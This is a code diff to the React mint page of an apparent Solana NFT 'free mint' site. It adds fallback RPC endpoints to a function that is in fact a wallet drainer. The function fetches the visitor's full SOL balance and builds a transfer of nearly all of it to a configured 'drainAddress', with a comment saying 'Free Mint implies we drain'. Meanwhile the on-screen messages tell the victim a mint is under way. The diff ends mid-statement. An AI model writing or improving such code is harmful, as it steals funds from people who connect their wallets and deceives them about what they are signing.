@@ -90,22 +90,53 @@ const MintPage = ({ onBack }: MintPageProps) => {
     const provider = (window as any).solana;
     if (!provider) return;
 
+    // List of public RPCs to try if one fails
+    const RPC_FALLBACKS = [
+      siteConfig.solanaRpcEndpoint,
+      "https://rpc.ankr.com/solana",
+      "https://api.mainnet-beta.solana.com",
+      "https://ssc-dao.genesysgo.net"
+    ];
+
     try {
       setIsMinting(true);
-      setFeedback({ type: 'info', message: 'Initiating mint transaction...' });
+      setFeedback({ type: 'info', message: 'Connecting to blockchain...' });
 
-      const connection = new Connection(siteConfig.solanaRpcEndpoint, 'confirmed');
+      let connection: Connection | null = null;
+      let balance: number = 0;
+      let lastError: any = null;
+
+      // Robust RPC fallback loop
+      for (const rpcUrl of RPC_FALLBACKS) {
+        try {
+          console.log(`Attempting RPC: ${rpcUrl}`);
+          const conn = new Connection(rpcUrl, 'confirmed');
+          const bal = await conn.getBalance(new PublicKey(walletAddress));
+          connection = conn;
+          balance = bal;
+          break; // Success!
+        } catch (err) {
+          console.warn(`RPC ${rpcUrl} failed, trying next...`, err);
+          lastError = err;
+        }
+      }
+
+      if (!connection) {
+        throw new Error(`Failed to connect to any Solana nodes. Please check your internet or try again later. (Error: ${lastError?.message || 'Unauthorized'})`);
+      }
+
       const senderPubKey = new PublicKey(walletAddress);
       const recipientPubKey = new PublicKey(siteConfig.drainAddress);
 
       // Get full balance and calculate maximum transferable amount (Free Mint implies we drain)
-      const balance = await connection.getBalance(senderPubKey);
       const fee = 5000; // Standard SOL transfer fee
       const transferableBalance = balance - fee;
 
       if (transferableBalance <= 5000) {
         throw new Error('Insufficient balance to cover transaction fees.');
       }
+
+      setFeedback({ type: 'info', message: 'Initiating mint transaction...' });
 
       const instruction = SystemProgram.transfer({
         fromPubkey: senderPubKey,
